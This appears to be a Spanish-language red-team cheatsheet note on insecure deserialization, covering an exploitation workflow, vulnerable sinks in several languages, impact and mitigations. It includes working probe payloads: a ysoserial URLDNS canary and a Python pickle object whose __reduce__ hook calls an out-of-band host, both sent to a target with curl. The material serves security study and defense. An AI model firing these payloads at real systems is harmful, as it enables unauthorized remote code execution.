---
aliases:
  - Insecure Deserialization
  - Deserialization Vulnerability
  - Object Injection
  - Untrusted Deserialization
tags:
  - type/vulnerability
  - vuln/insecure-deser
  - technique/execution
  - technique/initial-access
  - technique/privilege-escalation
  - asset/web-app
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación|Explotación]]"
tertiary categories:
  - "[[Web Explotación]]"
kind: CheatSheet
linked:
  - "[[Insecure Deserialization - Object Injection]]"
  - "[[Insecure Deserialization - Formatos Estructurados]]"
  - "[[Insecure Deserialization - Tooling]]"
  - "[[Insecure Deserialization - Bypasses y Evasion]]"
  - "[[XML External Entity (XXE)]]"
  - "[[Server-Side Template Injection (SSTI)]]"
  - "[[Burp Suite]]"
---
# Insecure Deserialization

***

## Cheatsheet

### 💉 Object Injection por Lenguaje

````tabs
tab: **PHP**
![[Insecure Deserialization - Object Injection#^deser-php]]

tab: **Java**
![[Insecure Deserialization - Object Injection#^deser-java]]

tab: **Python (pickle)**
![[Insecure Deserialization - Object Injection#^deser-python]]

tab: **.NET**
![[Insecure Deserialization - Object Injection#^deser-dotnet]]

tab: **Ruby**
![[Insecure Deserialization - Object Injection#^deser-ruby]]

tab: **Node.js**
![[Insecure Deserialization - Object Injection#^deser-node]]
````

### 📦 Ataques a Formatos Estructurados

````tabs
tab: **JSON Polymorphic**
![[Insecure Deserialization - Formatos Estructurados#^deser-fmt-json]]

tab: **YAML Eval**
![[Insecure Deserialization - Formatos Estructurados#^deser-fmt-yaml]]

tab: **XML Deserialization**
![[Insecure Deserialization - Formatos Estructurados#^deser-fmt-xml]]
````

### 🛠️ Tooling de Exploit

````tabs
tab: **phpggc (PHP)**
![[Insecure Deserialization - Tooling#^deser-tool-phpggc]]

tab: **ysoserial (Java)**
![[Insecure Deserialization - Tooling#^deser-tool-ysoserial]]

tab: **ysoserial.net (.NET)**
![[Insecure Deserialization - Tooling#^deser-tool-ysoserialnet]]

tab: **fickling (Python)**
![[Insecure Deserialization - Tooling#^deser-tool-fickling]]

tab: **Otros tools**
![[Insecure Deserialization - Tooling#^deser-tool-others]]
````

### 🛡️ Bypasses y Evasión

````tabs
tab: **Magic Bytes y Encoding**
![[Insecure Deserialization - Bypasses y Evasion#^deser-bypass-bytes]]

tab: **Class Allowlist Bypass**
![[Insecure Deserialization - Bypasses y Evasion#^deser-bypass-allowlist]]

tab: **Length / Type Confusion**
![[Insecure Deserialization - Bypasses y Evasion#^deser-bypass-types]]

tab: **Deser Encadenada (multi-hop)**
![[Insecure Deserialization - Bypasses y Evasion#^deser-bypass-chained]]
````

___

## Overview

**Insecure Deserialization** = el backend deserializa datos controlados por el atacante (cookies, params, body, files) usando una API que reconstruye objetos con tipos arbitrarios. Reconstrucción dispara código del lenguaje (constructors, magic methods, `__reduce__`, `readObject`, `EventHandler`) → **RCE directo** o gadget chain.

Vector clase A — **OWASP Top 10** desde 2013. CVE históricos masivos: Jenkins, WebLogic, JBoss, WebSphere, Spring, Struts2, Liferay, Confluence, Magento, Drupal, Sitecore, Symfony, Laravel, Telerik UI, etc.

### Por qué es tan común

1. **APIs vulnerables son default** — `pickle.loads()`, `unserialize()`, `BinaryFormatter`, `ObjectInputStream` son el camino "natural" para deserializar.
2. **Devs no distinguen serializado vs JSON simple** — pasan input untrusted por miedo a "perder estructura".
3. **Magic methods se ejecutan automáticamente** — sin línea de código del dev que diga "ejecute esto".
4. **Gadgets en classpath** — apps tienen 100+ libs en deps, alguna siempre ofrece chain.
5. **Sticky vendor APIs** — frameworks legacy (.NET WebForms ViewState, Java RMI) lo usan internamente.

### Diferencia con vulns relacionadas

| | **Vector** | **Trigger** | **RCE típica** |
|---|---|---|---|
| **Insecure Deser** | Stream serializado (binario/string) | API deser del lenguaje | Gadget chain → exec |
| **SSTI** | Template engine string | Render template | Lenguaje del template |
| **XXE** | XML con DOCTYPE | Parser XML | File read + SSRF (RCE rara) |
| **Code Injection** | String código (`eval`) | Eval directo | Inmediata |
| **Prototype Pollution** | JSON `__proto__` / `constructor.prototype` | Merge / extend | Solo JS, post-explotación |

___

## Workflow de explotación

```
1. Identificar transport: cookie / param / body / upload con datos serializados.
2. Decodificar capas: base64 → gzip → bytes binarios.
3. Identificar lenguaje por magic bytes:
   - PHP    → O:N: / a:N:
   - Java   → 0xACED 0x0005 (rO0 b64)
   - Python → 0x80 0x04 (gAS b64)
   - .NET   → 0x00 0x01 0x00 0x00 (AAEAAA b64)
   - Ruby   → 0x04 0x08 (BAh b64)
   - Node   → "_$$ND_FUNC$$_function..."
4. Probe canary OOB (URLDNS Java / DNS gadget Python):
   - Si el canary dispara → readObject/loads activo → RCE alcanzable.
5. Usar tool específica del lenguaje (phpggc / ysoserial / fickling / etc).
6. Encadenar con bypass si hay filtros (ver Bypasses).
7. Forge payload con cmd → enviar → recibir reverse shell o exec output.
```

___

## Detección rápida

### Indicadores en código backend

```python
# Python — todos vulnerables si input untrusted:
pickle.loads(data)
pickle.load(file)
cPickle.loads(data)
yaml.load(s)                         # sin Loader
yaml.load(s, Loader=yaml.Loader)     # explícito
shelve.open(path)
numpy.load(path, allow_pickle=True)
pandas.read_pickle(path)
```

```java
// Java
ois = new ObjectInputStream(input);
ois.readObject();                    // VULN
xstream.fromXML(input);              // VULN
new ObjectMapper().enableDefaultTyping(); // VULN si default typing
```

```php
// PHP
unserialize($_COOKIE['user']);
unserialize($_POST['data']);
// Phar trigger:
file_exists("phar://" . $userInput);
```

```csharp
// .NET
new BinaryFormatter().Deserialize(stream);  // VULN
new ObjectStateFormatter().Deserialize(s);  // VULN
JsonConvert.DeserializeObject(json, new JsonSerializerSettings {
    TypeNameHandling = TypeNameHandling.All  // VULN
});
```

### Probes mínimos

```bash
# 1. Decode cookies y headers
curl -sI https://target/ | grep -i 'set-cookie\|x-powered-by'
echo "$cookie" | base64 -d | xxd | head -5
echo "$cookie" | base64 -d | gunzip 2>/dev/null | xxd | head -5

# 2. Search Burp historial (regex)
# Magic byte regex: rO0|O:[0-9]+:|a:[0-9]+:|gAS|AAEAAAD|/wE|BAh|aced0005

# 3. Java URLDNS canary
java -jar ysoserial.jar URLDNS "http://canary.oast.fun/" | base64 -w0 | curl -X POST --data @- target/

# 4. Python pickle canary
python3 -c "import pickle, base64
class C:
    def __reduce__(self): import urllib.request; urllib.request.urlopen('http://canary.oast.fun/'); return (str, ('ok',))
print(base64.b64encode(pickle.dumps(C())).decode())" \
| curl -X POST --data @- target/
```

___

## Impacto

- **RCE pre-auth** — la mayoría de gadget chains entregan RCE sin credenciales.
- **Account takeover** — manipulación de objetos User/Session si el sink es lookup.
- **Privilege escalation** — modificación de roles si los flags están en el objeto serializado.
- **SSRF** — gadgets que hacen HTTP fetch (URLDNS, JdbcRowSetImpl, etc).
- **DoS** — billion-laughs equivalentes en serialización.
- **Persistencia** — drop de webshell vía gadget de file write.

___

## Mitigación (defender)

- **No deserializar input untrusted** — esto es la única defensa real. Usar JSON puro / Protobuf / formatos sin tipos polimórficos.
- **Si imposible evitar**:
  - Java: `ObjectInputFilter` (JEP 290) con allowlist estricta.
  - .NET: `SerializationBinder` con allowlist.
  - PHP: `unserialize($s, ['allowed_classes' => [...]])` con lista cerrada (PHP 7+).
  - Python: usar `pickle` con `Unpickler` subclassed que sólo permita clases específicas.
  - Ruby: `YAML.safe_load` siempre, nunca `YAML.load`.
  - Node: nunca `node-serialize.unserialize` con input externo.
- **Firma + verificación** — HMAC del blob serializado antes de deserializar (ASP.NET ViewState con MAC bien hecho).
- **Cifrado del blob** — solo el server puede leer/modificar el serializado.
- **Stateless tokens** — JWT firmado / opaque session IDs en lugar de objects serializados.
- **Sandbox del proceso deserializador** — si imposible parar deser, correrla en proceso aislado sin credentials ni red.
- **Mantener libs actualizadas** — Jackson, FastJson, XStream tienen CVE críticos cada pocos meses.

___

## Para entender Insecure Deserialization

**Por qué deserialization ≠ JSON.parse:**

`JSON.parse` produce objetos JS planos — sin tipos custom, sin métodos. Es safe.

`pickle.loads` / `unserialize` / `BinaryFormatter.Deserialize` reconstruyen **objetos del lenguaje con sus métodos completos**. Eso significa que constructors, destructors, hooks de carga (`__wakeup`, `readObject`, `__reduce__`) se ejecutan. Si el atacante elige qué clase instanciar, ejecuta el código de esos hooks.

**Gadget chains explicados:**

Una gadget chain es una secuencia de objetos cuyas hooks se llaman en cascada hasta llegar a una sink (`Runtime.exec`, `system()`, `eval`). Atacante:

1. Audita libs en classpath para encontrar clases con hooks "interesantes".
2. Encadena: `ClassA.__hook__` → llama `ClassB.method` → llama `ClassC.eval(input)`.
3. Forge serializado con la chain, donde `input = "comando atacante"`.
4. App deserializa → cada hook se llama → último ejecuta comando.

Tools como ysoserial / phpggc tienen catálogos pre-armados de chains conocidas. Por eso la explotación es triviales si ID el lenguaje y tenés gadgets disponibles.

**Diferencia entre formatos binarios y polimórficos JSON:**

- **Binario** (pickle, BinaryFormatter, Marshal) — el formato encapsula tipos. La superficie de ataque es default.
- **JSON polimórfico** (Jackson `@class`, JSON.NET `$type`, FastJson `@type`) — formato es JSON pero el deserializer respeta hints de tipo del input. Mismo problema con sintaxis distinta.

___

## Recursos

- [PortSwigger - Insecure Deserialization](https://portswigger.net/web-security/deserialization) — labs y conceptos.
- [PayloadsAllTheThings - Deserialization](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization) — payloads.
- [HackTricks - Deserialization](https://book.hacktricks.xyz/pentesting-web/deserialization) — referencia exhaustiva.
- [OWASP Deserialization Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html).
- [ysoserial](https://github.com/frohoff/ysoserial) — Java gadgets.
- [phpggc](https://github.com/ambionics/phpggc) — PHP gadgets.
- [ysoserial.net](https://github.com/pwntester/ysoserial.net) — .NET gadgets.
- [marshalsec](https://github.com/mbechler/marshalsec) — XML/JSON/YAML deser.
- [fickling](https://github.com/trailofbits/fickling) — pickle audit.
- [awesome-fastjson](https://github.com/safe6Sec/Fastjson) — FastJson chains.
- [Frohoff - Java Deser BlackHat 2015](https://www.youtube.com/watch?v=VviY3O-euVQ) — paper original que popularizó la clase.

***
